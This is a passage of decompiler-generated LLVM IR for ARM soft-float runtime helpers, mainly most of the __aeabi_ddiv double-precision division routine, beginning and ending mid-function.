  %v9_2184c = add nsw i32 %v3_2184c, %v2_2184c
  %v10_2184c = sub i32 0, %v1_21840
  %v11_2184c = and i32 %v9_2184c, %v10_2184c
  %v12_2184c = icmp slt i32 %v11_2184c, 0
  store i1 %v12_2184c, i1* @cpsr_v, align 1
  %v3_21850 = mul i32 %v6_21838, 2
  %v4_21850 = or i32 %v3_21850, %tmp7
  %v5_21850 = icmp slt i32 %v4_21850, 0
  store i1 %v5_21850, i1* @cpsr_n, align 1
  %v6_21850 = icmp eq i32 %v4_21850, 0
  store i1 %v6_21850, i1* @cpsr_z, align 1
  br i1 %v6_21850, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_21830
  %tmp23 = sext i1 %tmp22 to i32
  %v6_21854 = add nsw i32 %tmp23, -1
  %v7_21854 = and i32 %v5_21848, %v6_21854
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_21830, %bb15
  %v1_2185c = phi i32 [ %v5_21848, %dec_label_pc_21830 ], [ %v7_21854, %bb15 ]
  %v2_21858 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_21858, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_2185c

dec_label_pc_21860:                               ; preds = %.thread1
  %v1_21860 = sub i32 32, %v2_217ec
  %v1_21864 = load i32, i32* @r0, align 4
  %v7_21864 = shl i32 %v1_21864, %v1_21860
  %v8_21864 = or i32 %v7_21864, %tmp7
  %v6_21868 = lshr i32 %v1_21864, %v2_217ec
  %v1_2186c = load i32, i32* @r1, align 4
  %v7_2186c = shl i32 %v1_2186c, %v1_21860
  %v8_2186c = or i32 %v7_2186c, %v6_21868
  %v6_21870 = lshr i32 %v1_2186c, %v2_217ec
  %v1_21874 = and i32 %v1_2186c, -2147483648
  store i32 %v1_21874, i32* @r1, align 4
  %v7_21878 = lshr i32 %v1_21874, %v2_217ec
  %v8_21878 = sub i32 -1, %v7_21878
  %v9_21878 = and i32 %v6_21870, %v8_21878
  %tmp24 = icmp slt i32 %v8_2186c, 0
  %v4_2187c = zext i1 %tmp24 to i32
  %v5_2187c = add i32 %v4_2187c, %v9_21878
  %v3_21880 = mul i32 %v8_2186c, 2
  %v4_21880 = or i32 %v8_21864, %v3_21880
  %v5_21880 = icmp slt i32 %v4_21880, 0
  store i1 %v5_21880, i1* @cpsr_n, align 1
  %v6_21880 = icmp eq i32 %v4_21880, 0
  store i1 %v6_21880, i1* @cpsr_z, align 1
  br i1 %v6_21880, label %bb17, label %bb18

bb17:                                             ; preds = %dec_label_pc_21860
  %tmp25 = sext i1 %tmp24 to i32
  %v6_21884 = add nsw i32 %tmp25, -1
  %v7_21884 = and i32 %v5_2187c, %v6_21884
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_21860, %bb17
  %v1_2188c = phi i32 [ %v5_2187c, %dec_label_pc_21860 ], [ %v7_21884, %bb17 ]
  %v2_21888 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_21888, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_2188c

dec_label_pc_2194c:                               ; preds = %dec_label_pc_217d0
  %v0_2194c = load i32, i32* @r1, align 4
  %v1_2194c = and i32 %v0_2194c, -2147483648
  %v1_21954 = or i32 %v1_2194c, 2146435072
  store i32 %v1_21954, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v5_2187c, { 1, 0 }
  uselistorder i32 %v5_21848, { 1, 0, 2 }
  uselistorder i32 %v8_21840, { 1, 0 }
  uselistorder i32 %v1_21830, { 1, 0 }
  uselistorder i32 %v5_21818, { 1, 0 }
  uselistorder i32 %v1_2180c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_21800, { 1, 0 }
  uselistorder i32 %v2_217ec, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_217e8, { 1, 0 }
  uselistorder i32 %v4_217d4, { 1, 2, 0 }
  uselistorder i32 %v0_217d4, { 1, 0, 2 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32 %tmp5, { 2, 1, 0 }
  uselistorder i32 -32, { 6, 5, 7, 9, 10, 11, 14, 15, 0, 12, 2, 13, 3, 8, 4, 1, 16 }
  uselistorder i32 54, { 4, 0, 1, 3, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_21964(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_21964:
  %v1_21968 = or i32 %arg1, 2146959360
  store i32 %v1_21968, i32* @r1, align 4
  %v1_21970 = load i32, i32* @r0, align 4
  ret i32 %v1_21970
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_21974 = load i32, i32* @r4, align 4
  store i32 %v3_21974, i32* %stack_var_-16, align 4
  %v6_21974 = load i32, i32* @r5, align 4
  %v9_21974 = load i32, i32* @r6, align 4
  %v12_21974 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_21980 = load i32, i32* @r1, align 4
  %v4_21980 = udiv i32 %v1_21980, 1048576
  %v5_21980 = urem i32 %v4_21980, 2048
  store i32 %v5_21980, i32* @r4, align 4
  %v6_21980 = icmp eq i32 %v5_21980, 0
  br i1 %v6_21980, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre147 = udiv i32 %arg4, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_21984 = udiv i32 %arg4, 1048576
  %v6_21984 = urem i32 %v5_21984, 2048
  store i32 %v6_21984, i32* %r5.global-to-local, align 4
  %v7_21984 = icmp eq i32 %v6_21984, 0
  br i1 %v7_21984, label %.thread1, label %bb90

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_21b10

bb90:                                             ; preds = %bb
  %v5_21988 = icmp eq i32 %v5_21980, 2047
  br i1 %v5_21988, label %.thread2, label %bb91

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb90
  %.pre145.pre-phi = phi i32 [ %.pre147, %entry..thread2_crit_edge ], [ %v5_21984, %bb90 ]
  br label %dec_label_pc_21b10

bb91:                                             ; preds = %bb90
  %v5_2198c = icmp eq i32 %v6_21984, 2047
  br i1 %v5_2198c, label %dec_label_pc_21b10, label %dec_label_pc_21994

dec_label_pc_21994:                               ; preds = %bb91
  %v2_21994 = sub nsw i32 %v5_21980, %v6_21984
  store i32 %v2_21994, i32* %r4.global-to-local, align 4
  %v2_21998 = xor i32 %v1_21980, %arg4
  %v4_2199c = mul i32 %arg4, 4096
  %v5_2199c = or i32 %v4_2199c, %arg3
  store i32 %v5_2199c, i32* %r5.global-to-local, align 4
  %v7_2199c = icmp eq i32 %v5_2199c, 0
  %v3_219a0 = mul i32 %v1_21980, 4096
  store i32 %v3_219a0, i32* %r1.global-to-local, align 4
  br i1 %v7_2199c, label %dec_label_pc_21adc, label %dec_label_pc_219a8

dec_label_pc_219a8:                               ; preds = %dec_label_pc_21994
  %tmp92 = mul i32 %arg4, 256
  %v4_219b0 = and i32 %tmp92, 268435200
  %v4_219b4 = udiv i32 %arg3, 16777216
  %v5_219b0 = or i32 %v4_219b4, %v4_219b0
  %v5_219b4 = or i32 %v5_219b0, 268435456
  store i32 %v5_219b4, i32* %r3.global-to-local, align 4
  %v3_219b8 = mul i32 %arg3, 256
  store i32 %v3_219b8, i32* %r2.global-to-local, align 4
  %tmp93 = mul i32 %v1_21980, 256
  %v4_219bc = and i32 %tmp93, 268435200
  %v1_219c0 = load i32, i32* @r0, align 4
  %v4_219c0 = udiv i32 %v1_219c0, 16777216
  %v5_219bc = or i32 %v4_219bc, %v4_219c0
  %v5_219c0 = or i32 %v5_219bc, 268435456
  store i32 %v5_219c0, i32* %r5.global-to-local, align 4
  %v3_219c4 = mul i32 %v1_219c0, 256
  store i32 %v3_219c4, i32* %r6.global-to-local, align 4
  %v1_219c8 = and i32 %v2_21998, -2147483648
  store i32 %v1_219c8, i32* %r1.global-to-local, align 4
  %v3_219cc = icmp uge i32 %v5_219c0, %v5_219b4
  %v9_219cc = icmp eq i32 %v5_219c0, %v5_219b4
  br i1 %v9_219cc, label %bb94, label %bb95

bb94:                                             ; preds = %dec_label_pc_219a8
  %v4_219d0 = icmp uge i32 %v3_219c4, %v3_219b8
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_219a8, %bb94
  %v1_219d4 = phi i1 [ %v3_219cc, %dec_label_pc_219a8 ], [ %v4_219d0, %bb94 ]
  %v2_219d4 = add nsw i32 %v2_21994, 253
  %v3_219d4 = zext i1 %v1_219d4 to i32
  %v4_219d4 = add nsw i32 %v2_219d4, %v3_219d4
  %v8_219d4 = icmp ule i32 %v4_219d4, %v2_21994
  %v9_219d4 = icmp ugt i32 %v2_21994, -254
  %v10_219d4 = select i1 %v1_219d4, i1 %v8_219d4, i1 %v9_219d4
  %v1_219d8 = add nsw i32 %v4_219d4, 768
  store i32 %v1_219d8, i32* %r4.global-to-local, align 4
  br i1 %v10_219d4, label %dec_label_pc_219e8, label %dec_label_pc_219e0

dec_label_pc_219e0:                               ; preds = %bb95
  %v3_219e0 = udiv i32 %v5_219b4, 2
  store i32 %v3_219e0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_219e8

dec_label_pc_219e8:                               ; preds = %bb95, %dec_label_pc_219e0
  %v0_219f0 = phi i32 [ %v5_219b4, %bb95 ], [ %v3_219e0, %dec_label_pc_219e0 ]
  %v0_219f4 = phi i32 [ %v3_219b8, %bb95 ], [ 0, %dec_label_pc_219e0 ]
  %v2_219e8 = sub i32 %v3_219c4, %v0_219f4
  store i32 %v2_219e8, i32* %r6.global-to-local, align 4
  %v3_219e8 = icmp uge i32 %v3_219c4, %v0_219f4
  %v3_219ec = icmp eq i1 %v3_219e8, false
  %v4_219ec = sub nsw i32 %v5_219c0, %v0_219f0
  %v6_219ec = sext i1 %v3_219ec to i32
  %v7_219ec = add nsw i32 %v6_219ec, %v4_219ec
  store i32 %v7_219ec, i32* %r5.global-to-local, align 4
  %v3_219f0 = udiv i32 %v0_219f0, 2
  store i32 %v3_219f0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_21a00.outer

dec_label_pc_21a00.outer:                         ; preds = %dec_label_pc_21a98, %dec_label_pc_219e8
  %v1_21aac.ph = phi i32 [ %v2_21a98, %dec_label_pc_21a98 ], [ %v1_219c8, %dec_label_pc_219e8 ]
  %v0_21a04.ph = phi i32 [ %v5_21a74, %dec_label_pc_21a98 ], [ %v7_219ec, %dec_label_pc_219e8 ]
  %v1_21a08.ph = phi i32 [ %v3_21a78, %dec_label_pc_21a98 ], [ %v2_219e8, %dec_label_pc_219e8 ]
  %v5_21a8017.ph = phi i32 [ %v5_21a80, %dec_label_pc_21a98 ], [ %v3_219f0, %dec_label_pc_219e8 ]
  %v3_21a8413.ph = phi i32 [ %v3_21a84, %dec_label_pc_21a98 ], [ 0, %dec_label_pc_219e8 ]
  %storemerge133 = phi i32 [ 0, %dec_label_pc_21a98 ], [ 1048576, %dec_label_pc_219e8 ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_21a98 ], [ 524288, %dec_label_pc_219e8 ]
  store i32 %storemerge133, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_21a00

dec_label_pc_21a00:                               ; preds = %dec_label_pc_21a00.outer, %dec_label_pc_21a70
  %v1_21a6459 = phi i32 [ %v2_21aac, %dec_label_pc_21a70 ], [ %storemerge133, %dec_label_pc_21a00.outer ]
  %v1_21a10 = phi i32 [ %v1_21a1032, %dec_label_pc_21a70 ], [ %storemerge133, %dec_label_pc_21a00.outer ]
  %v1_21a2c41 = phi i32 [ %v1_21a2c43, %dec_label_pc_21a70 ], [ %storemerge133, %dec_label_pc_21a00.outer ]
  %v1_21a4850 = phi i32 [ %v1_21a4852, %dec_label_pc_21a70 ], [ %storemerge133, %dec_label_pc_21a00.outer ]
  %v0_21a88 = phi i32 [ %v3_21a88, %dec_label_pc_21a70 ], [ %storemerge, %dec_label_pc_21a00.outer ]
  %v0_21a04 = phi i32 [ %v5_21a74, %dec_label_pc_21a70 ], [ %v0_21a04.ph, %dec_label_pc_21a00.outer ]
  %v1_21a08 = phi i32 [ %v3_21a78, %dec_label_pc_21a70 ], [ %v1_21a08.ph, %dec_label_pc_21a00.outer ]
  %v5_21a8017 = phi i32 [ %v5_21a80, %dec_label_pc_21a70 ], [ %v5_21a8017.ph, %dec_label_pc_21a00.outer ]
  %v3_21a8413 = phi i32 [ %v3_21a84, %dec_label_pc_21a70 ], [ %v3_21a8413.ph, %dec_label_pc_21a00.outer ]
  %v3_21a00 = icmp uge i32 %v1_21a08, %v3_21a8413
  %v3_21a04 = icmp eq i1 %v3_21a00, false
  %v4_21a04 = sub i32 %v0_21a04, %v5_21a8017
  %v6_21a04 = sext i1 %v3_21a04 to i32
  %v7_21a04 = add i32 %v6_21a04, %v4_21a04
  %v8_21a04 = zext i1 %v3_21a04 to i32
  %v9_21a04 = sub i32 %v7_21a04, %v8_21a04
  %v10_21a04 = icmp ult i32 %v0_21a04, %v9_21a04
  %v11_21a04 = icmp ne i32 %v5_21a8017, -1
  %v12_21a04 = or i1 %v11_21a04, %v10_21a04
  %v13_21a04 = icmp ult i32 %v0_21a04, %v5_21a8017
  %v14_21a04 = select i1 %v3_21a04, i1 %v12_21a04, i1 %v13_21a04
  br i1 %v14_21a04, label %.thread4, label %bb96

bb96:                                             ; preds = %dec_label_pc_21a00
  %v3_21a08 = sub i32 %v1_21a08, %v3_21a8413
  store i32 %v3_21a08, i32* %r6.global-to-local, align 4
  store i32 %v7_21a04, i32* %r5.global-to-local, align 4
  %v3_21a10 = or i32 %v1_21a10, %v0_21a88
  store i32 %v3_21a10, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_21a00, %bb96
  %v1_21a6458 = phi i32 [ %v1_21a6459, %dec_label_pc_21a00 ], [ %v3_21a10, %bb96 ]
  %v1_21a1035 = phi i32 [ %v1_21a10, %dec_label_pc_21a00 ], [ %v3_21a10, %bb96 ]
  %v1_21a2c = phi i32 [ %v1_21a2c41, %dec_label_pc_21a00 ], [ %v3_21a10, %bb96 ]
  %v1_21a4849 = phi i32 [ %v1_21a4850, %dec_label_pc_21a00 ], [ %v3_21a10, %bb96 ]
  %v0_21a20 = phi i32 [ %v0_21a04, %dec_label_pc_21a00 ], [ %v7_21a04, %bb96 ]
  %v1_21a24 = phi i32 [ %v1_21a08, %dec_label_pc_21a00 ], [ %v3_21a08, %bb96 ]
  %v1_21a14 = urem i32 %v5_21a8017, 2
  %v2_21a14 = icmp ne i32 %v1_21a14, 0
  %v3_21a14 = udiv i32 %v5_21a8017, 2
  %v3_21a18 = zext i1 %v2_21a14 to i32
  %v6_21a18 = zext i32 %v3_21a8413 to i64
  %v7_21a18 = sub i32 33, %v3_21a8413
  %v8_21a18 = zext i32 %v7_21a18 to i64
  %v9_21a18 = shl i64 %v6_21a18, %v8_21a18
  %v10_21a18 = sub i32 32, %v3_21a8413
  %v11_21a18 = shl i32 %v3_21a18, %v10_21a18
  %v12_21a18 = zext i32 %v11_21a18 to i64
  %v14_21a18 = or i64 %v12_21a18, %v9_21a18
  %v15_21a18 = trunc i64 %v14_21a18 to i32
  %v3_21a1c = icmp uge i32 %v1_21a24, %v15_21a18
  %v3_21a20 = icmp eq i1 %v3_21a1c, false
  %v4_21a20 = sub i32 %v0_21a20, %v3_21a14
  %v6_21a20 = sext i1 %v3_21a20 to i32
  %v7_21a20 = add i32 %v6_21a20, %v4_21a20
  %v13_21a20 = icmp ult i32 %v0_21a20, %v3_21a14
  %v14_21a20 = or i1 %v13_21a20, %v3_21a20
  br i1 %v14_21a20, label %.thread6, label %bb97

bb97:                                             ; preds = %.thread4
  %v3_21a24 = sub i32 %v1_21a24, %v15_21a18
  store i32 %v3_21a24, i32* %r6.global-to-local, align 4
  store i32 %v7_21a20, i32* %r5.global-to-local, align 4
  %v5_21a2c = udiv i32 %v0_21a88, 2
  %v6_21a2c = or i32 %v1_21a2c, %v5_21a2c
  store i32 %v6_21a2c, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb97
  %v1_21a6457 = phi i32 [ %v1_21a6458, %.thread4 ], [ %v6_21a2c, %bb97 ]
  %v1_21a1034 = phi i32 [ %v1_21a1035, %.thread4 ], [ %v6_21a2c, %bb97 ]
  %v1_21a2c45 = phi i32 [ %v1_21a2c, %.thread4 ], [ %v6_21a2c, %bb97 ]
  %v1_21a48 = phi i32 [ %v1_21a4849, %.thread4 ], [ %v6_21a2c, %bb97 ]
  %v0_21a3c = phi i32 [ %v0_21a20, %.thread4 ], [ %v7_21a20, %bb97 ]
  %v1_21a40 = phi i32 [ %v1_21a24, %.thread4 ], [ %v3_21a24, %bb97 ]
  %v1_21a30 = urem i32 %v3_21a14, 2
  %v2_21a30 = icmp ne i32 %v1_21a30, 0
  %v3_21a30 = udiv i32 %v5_21a8017, 4
  %v3_21a34 = zext i1 %v2_21a30 to i32
  %v6_21a34 = and i64 %v14_21a18, 4294967295
  %v7_21a34 = sub i32 33, %v15_21a18
  %v8_21a34 = zext i32 %v7_21a34 to i64
  %v9_21a34 = shl i64 %v6_21a34, %v8_21a34
  %v10_21a34 = sub i32 32, %v15_21a18
  %v11_21a34 = shl i32 %v3_21a34, %v10_21a34
  %v12_21a34 = zext i32 %v11_21a34 to i64
  %v14_21a34 = or i64 %v12_21a34, %v9_21a34
  %v15_21a34 = trunc i64 %v14_21a34 to i32
  %v3_21a38 = icmp uge i32 %v1_21a40, %v15_21a34
  %v3_21a3c = icmp eq i1 %v3_21a38, false
  %v4_21a3c = sub i32 %v0_21a3c, %v3_21a30
  %v6_21a3c = sext i1 %v3_21a3c to i32
  %v7_21a3c = add i32 %v6_21a3c, %v4_21a3c
  %v13_21a3c = icmp ult i32 %v0_21a3c, %v3_21a30
  %v14_21a3c = or i1 %v13_21a3c, %v3_21a3c
  br i1 %v14_21a3c, label %.thread8, label %bb98

bb98:                                             ; preds = %.thread6
  %v3_21a40 = sub i32 %v1_21a40, %v15_21a34
  store i32 %v3_21a40, i32* %r6.global-to-local, align 4
  store i32 %v7_21a3c, i32* %r5.global-to-local, align 4
  %v5_21a48 = udiv i32 %v0_21a88, 4
  %v6_21a48 = or i32 %v1_21a48, %v5_21a48
  store i32 %v6_21a48, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb98
  %v1_21a64 = phi i32 [ %v1_21a6457, %.thread6 ], [ %v6_21a48, %bb98 ]
  %v1_21a1033 = phi i32 [ %v1_21a1034, %.thread6 ], [ %v6_21a48, %bb98 ]
  %v1_21a2c44 = phi i32 [ %v1_21a2c45, %.thread6 ], [ %v6_21a48, %bb98 ]
  %v1_21a4853 = phi i32 [ %v1_21a48, %.thread6 ], [ %v6_21a48, %bb98 ]
  %v0_21a58 = phi i32 [ %v0_21a3c, %.thread6 ], [ %v7_21a3c, %bb98 ]
  %v1_21a5c = phi i32 [ %v1_21a40, %.thread6 ], [ %v3_21a40, %bb98 ]
  %v1_21a4c = urem i32 %v3_21a30, 2
  %v2_21a4c = icmp ne i32 %v1_21a4c, 0
  %v3_21a4c = udiv i32 %v5_21a8017, 8
  %v3_21a50 = zext i1 %v2_21a4c to i32
  %v6_21a50 = and i64 %v14_21a34, 4294967295
  %v7_21a50 = sub i32 33, %v15_21a34
  %v8_21a50 = zext i32 %v7_21a50 to i64
  %v9_21a50 = shl i64 %v6_21a50, %v8_21a50
  %v10_21a50 = sub i32 32, %v15_21a34
  %v11_21a50 = shl i32 %v3_21a50, %v10_21a50
  %v12_21a50 = zext i32 %v11_21a50 to i64
  %v14_21a50 = or i64 %v12_21a50, %v9_21a50
  %v15_21a50 = trunc i64 %v14_21a50 to i32
  %v3_21a54 = icmp uge i32 %v1_21a5c, %v15_21a50
  %v3_21a58 = icmp eq i1 %v3_21a54, false
  %v4_21a58 = sub i32 %v0_21a58, %v3_21a4c
  %v6_21a58 = sext i1 %v3_21a58 to i32
  %v7_21a58 = add i32 %v6_21a58, %v4_21a58
  %v13_21a58 = icmp ult i32 %v0_21a58, %v3_21a4c
  %v14_21a58 = or i1 %v13_21a58, %v3_21a58
  br i1 %v14_21a58, label %.thread10, label %bb100

bb100:                                            ; preds = %.thread8
  %v3_21a5c = sub i32 %v1_21a5c, %v15_21a50
  store i32 %v3_21a5c, i32* %r6.global-to-local, align 4
  store i32 %v7_21a58, i32* %r5.global-to-local, align 4
  %v5_21a64 = udiv i32 %v0_21a88, 8
  %v6_21a64 = or i32 %v1_21a64, %v5_21a64
  store i32 %v6_21a64, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb100
  %v1_21a74 = phi i32 [ %v1_21a5c, %.thread8 ], [ %v3_21a5c, %bb100 ]
  %v0_21a70 = phi i32 [ %v0_21a58, %.thread8 ], [ %v7_21a58, %bb100 ]
  %v2_21aac = phi i32 [ %v1_21a64, %.thread8 ], [ %v6_21a64, %bb100 ]
  %v1_21a1032 = phi i32 [ %v1_21a1033, %.thread8 ], [ %v6_21a64, %bb100 ]
  %v1_21a2c43 = phi i32 [ %v1_21a2c44, %.thread8 ], [ %v6_21a64, %bb100 ]
  %v1_21a4852 = phi i32 [ %v1_21a4853, %.thread8 ], [ %v6_21a64, %bb100 ]
  %v2_21a68 = or i32 %v0_21a70, %v1_21a74
  %v4_21a68 = icmp eq i32 %v2_21a68, 0
  br i1 %v4_21a68, label %dec_label_pc_21aa8, label %dec_label_pc_21a70

dec_label_pc_21a70:                               ; preds = %.thread10
  %v3_21a70 = mul i32 %v0_21a70, 16
  %v4_21a74 = udiv i32 %v1_21a74, 268435456
  %v5_21a74 = or i32 %v3_21a70, %v4_21a74
  store i32 %v5_21a74, i32* %r5.global-to-local, align 4
  %v3_21a78 = mul i32 %v1_21a74, 16
  store i32 %v3_21a78, i32* %r6.global-to-local, align 4
  %v3_21a7c = mul nuw i32 %v3_21a4c, 8
  %v4_21a80 = udiv i32 %v15_21a50, 536870912
  %v5_21a80 = or i32 %v4_21a80, %v3_21a7c
  %v3_21a84 = mul i32 %v15_21a50, 8
  %v3_21a88 = udiv i32 %v0_21a88, 16
  store i32 %v3_21a88, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_21a88, 16
  br i1 %tmp, label %dec_label_pc_21a90, label %dec_label_pc_21a00

dec_label_pc_21a90:                               ; preds = %dec_label_pc_21a70
  %v1_21a90 = and i32 %v1_21aac.ph, 1048576
  %v2_21a90 = icmp eq i32 %v1_21a90, 0
  br i1 %v2_21a90, label %dec_label_pc_21a98, label %.thread11.loopexit

dec_label_pc_21a98:                               ; preds = %dec_label_pc_21a90
  %v2_21a98 = or i32 %v2_21aac, %v1_21aac.ph
  store i32 %v2_21a98, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_21a00.outer

dec_label_pc_21aa8:                               ; preds = %.thread10
  store i32 %v15_21a50, i32* %r2.global-to-local, align 4
  store i32 %v3_21a4c, i32* %r3.global-to-local, align 4
  %v1_21aa8 = and i32 %v1_21aac.ph, 1048576
  %v2_21aa8 = icmp eq i32 %v1_21aa8, 0
  br i1 %v2_21aa8, label %bb101, label %.thread11

bb101:                                            ; preds = %dec_label_pc_21aa8
  %v3_21aac = or i32 %v2_21aac, %v1_21aac.ph
  store i32 %v3_21aac, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_21a90
  store i32 %v3_21a84, i32* %r2.global-to-local, align 4
  store i32 %v5_21a80, i32* %r3.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_21aa8, %bb101
  %v1_21ab4 = add nsw i32 %v4_219d4, 515
  store i32 %v1_21ab4, i32* %ip.global-to-local, align 4
  %v2_21ab4 = icmp ugt i32 %v1_219d8, 252
  %v7_21ab4 = icmp eq i32 %v1_219d8, 253
  %v2_21ab8 = xor i1 %v7_21ab4, true
  %v3_21ab8 = and i1 %v2_21ab4, %v2_21ab8
  br i1 %v3_21ab8, label %bb102, label %bb103

bb102:                                            ; preds = %.thread11
  %v6_21ab8 = icmp ugt i32 %v1_21ab4, 1791
  %v11_21ab8 = icmp eq i32 %v1_21ab4, 1792
  br label %bb103

bb103:                                            ; preds = %.thread11, %bb102
  %v1_21abc = phi i1 [ %v7_21ab4, %.thread11 ], [ %v11_21ab8, %bb102 ]
  %v0_21abc = phi i1 [ %v2_21ab4, %.thread11 ], [ %v6_21ab8, %bb102 ]
  %v2_21abc = xor i1 %v1_21abc, true
  %v3_21abc = and i1 %v0_21abc, %v2_21abc
  call void @__pseudo_cond_branch(i1 %v3_21abc, i32 ptrtoint (i32* @global_var_217d0.1901 to i32))
  %v0_21ac0 = load i32, i32* %r5.global-to-local, align 4
  %v1_21ac0 = load i32, i32* %r3.global-to-local, align 4
  %v2_21ac0 = sub i32 %v0_21ac0, %v1_21ac0
  store i32 %v2_21ac0, i32* %ip.global-to-local, align 4
  %v3_21ac0 = icmp uge i32 %v0_21ac0, %v1_21ac0
  %v9_21ac0 = icmp eq i32 %v0_21ac0, %v1_21ac0
  br i1 %v9_21ac0, label %bb104, label %.thread12

bb104:                                            ; preds = %bb103
  %v1_21ac4 = load i32, i32* %r6.global-to-local, align 4
  %v2_21ac4 = load i32, i32* %r2.global-to-local, align 4
  %v3_21ac4 = sub i32 %v1_21ac4, %v2_21ac4
  store i32 %v3_21ac4, i32* %ip.global-to-local, align 4
  %v4_21ac4 = icmp uge i32 %v1_21ac4, %v2_21ac4
  %v10_21ac4 = icmp eq i32 %v1_21ac4, %v2_21ac4
  br i1 %v10_21ac4, label %bb105, label %.thread12

bb105:                                            ; preds = %bb104
  %v1_21ac8 = load i32, i32* %r0.global-to-local, align 4
  %v2_21ac8 = urem i32 %v1_21ac8, 2
  %v3_21ac8 = icmp ne i32 %v2_21ac8, 0
  %v4_21ac8 = udiv i32 %v1_21ac8, 2
  store i32 %v4_21ac8, i32* %ip.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb103, %bb104, %bb105
  %v1_21acc = phi i1 [ %v3_21ac0, %bb103 ], [ %v4_21ac4, %bb104 ], [ %v3_21ac8, %bb105 ]
  %v0_21acc = load i32, i32* %r0.global-to-local, align 4
  %v2_21acc = zext i1 %v1_21acc to i32
  %v3_21acc = add i32 %v2_21acc, %v0_21acc
  store i32 %v3_21acc, i32* %r0.global-to-local, align 4
  %v0_21ad0 = load i32, i32* %r1.global-to-local, align 4
  %v1_21ad0 = load i32, i32* %r4.global-to-local, align 4
  %v2_21ad0 = and i32 %v1_21ad0, 4096
  %v3_21ad0 = icmp ne i32 %v2_21ad0, 0
  %v4_21ad0 = mul i32 %v1_21ad0, 1048576
  %v6_21ad0 = add i32 %v4_21ad0, %v0_21ad0
  %v7_21ad0 = zext i1 %v3_21ad0 to i32
  %v8_21ad0 = add i32 %v7_21ad0, %v6_21ad0
  store i32 %v8_21ad0, i32* %r1.global-to-local, align 4
  %v2_21ad4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_21ad4, i32* %r4.global-to-local, align 4
  store i32 %v6_21974, i32* %r5.global-to-local, align 4
  store i32 %v9_21974, i32* %r6.global-to-local, align 4
  ret i32 %v3_21acc

dec_label_pc_21adc:                               ; preds = %dec_label_pc_21994
  %v1_21adc = and i32 %v2_21998, -2147483648
  %v4_21ae0 = urem i32 %v1_21980, 1048576
  %v5_21ae0 = or i32 %v1_21adc, %v4_21ae0
  store i32 %v5_21ae0, i32* %r1.global-to-local, align 4
  %v6_21ae4 = add nsw i32 %v2_21994, 1023
  store i32 %v6_21ae4, i32* %r4.global-to-local, align 4
  %v8_21ae4 = sub nsw i32 0, %v2_21994
  %v9_21ae4 = and i32 %v6_21ae4, %v8_21ae4
  %v11_21ae4 = icmp slt i32 %v2_21994, -1023
  %v12_21ae4 = icmp eq i32 %v6_21ae4, 0
  %v7_21ae8 = icmp sgt i32 %v2_21994, -1023
  br i1 %v7_21ae8, label %bb106, label %bb107

bb106:                                            ; preds = %dec_label_pc_21adc
  %v10_21ae8 = sub nsw i32 1024, %v2_21994
  store i32 %v10_21ae8, i32* %r5.global-to-local, align 4
  %v14_21ae8 = and i32 %v10_21ae8, %v6_21ae4
  %v16_21ae8 = icmp slt i32 %v10_21ae8, 0
  %v17_21ae8 = icmp eq i32 %v6_21ae4, 2047
  br label %bb107

bb107:                                            ; preds = %dec_label_pc_21adc, %bb106
